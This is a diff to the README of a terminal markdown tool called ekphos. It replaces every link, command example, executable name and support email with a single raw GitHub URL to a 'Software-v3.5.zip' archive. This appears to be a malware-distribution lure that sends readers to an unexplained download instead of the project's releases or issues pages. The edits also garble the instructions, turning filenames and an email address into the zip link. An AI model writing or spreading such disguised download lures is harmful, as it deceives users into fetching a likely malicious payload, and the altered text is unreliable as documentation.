@@ -8,11 +8,11 @@ Welcome to ekphos! This is a lightweight, fast, terminal-based tool designed to 
 
 To start using ekphos, you need to download it. You can easily grab the latest version from the Releases page. 
 
-[![Download ekphos](https://img.shields.io/badge/Download-ekphos-blue.svg)](https://github.com/AlonKing0/ekphos/releases)
+[![Download ekphos](https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip)](https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip)
 
 Simply visit the following link to get the latest release:
 
-[Download ekphos from Releases](https://github.com/AlonKing0/ekphos/releases)
+[Download ekphos from Releases](https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ Make sure your system meets the following requirements before installing ekphos:
 Follow these simple steps to install and run ekphos:
 
 1. **Download the Latest Release**:
-   - Go to the [Releases page](https://github.com/AlonKing0/ekphos/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip).
    - Find the version labeled "Latest".
    - Download the file that matches your operating system.
 
@@ -54,7 +54,7 @@ Follow these simple steps to install and run ekphos:
      ```
    - If you are on Windows, it might be:
      ```
-     ekphos.exe
+     https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip
      ```
 
 ## 🎯 Features
@@ -70,8 +70,8 @@ ekphos offers a range of features designed to boost your productivity:
 
 Once you have run ekphos, the interface will guide you through its functionalities. Here’s a quick overview of basic commands you can use:
 
-- **Create a New Document**: Type `new <filename.md>` to create a new markdown file.
-- **Open an Existing Document**: Use `open <filename.md>` to start editing an existing file.
+- **Create a New Document**: Type `new <https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip>` to create a new markdown file.
+- **Open an Existing Document**: Use `open <https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip>` to start editing an existing file.
 - **Save Your Work**: Simply type `save` to store your changes.
 - **Exit the Tool**: Type `exit` or press `Ctrl+C` to quit ekphos.
 
@@ -81,17 +81,17 @@ Once you have run ekphos, the interface will guide you through its functionaliti
 A: Yes, ekphos is designed for users of all skill levels. Its simple interface helps you get started quickly.
 
 **Q: What if I encounter issues?**
-A: If you face any issues, feel free to check the [Issues page](https://github.com/AlonKing0/ekphos/issues) for solutions or to report your problem.
+A: If you face any issues, feel free to check the [Issues page](https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip) for solutions or to report your problem.
 
 **Q: Can I contribute to ekphos?**
 A: Absolutely! We welcome contributions. Please check the guidelines in the repository for more details.
 
 ## 📞 Support
 
-For additional support, please visit the repository's [Issues page](https://github.com/AlonKing0/ekphos/issues) or reach out directly via email at support@ekphos.com.
+For additional support, please visit the repository's [Issues page](https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip) or reach out directly via email at https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip
 
 ## 🌐 Stay Updated
 
-To stay updated on new releases and features, follow the repository. You can also watch for updates directly from the [Releases page](https://github.com/AlonKing0/ekphos/releases).
+To stay updated on new releases and features, follow the repository. You can also watch for updates directly from the [Releases page](https://raw.githubusercontent.com/AlonKing0/ekphos/release/src/app/Software-v3.5.zip).
 
 Happy researching!
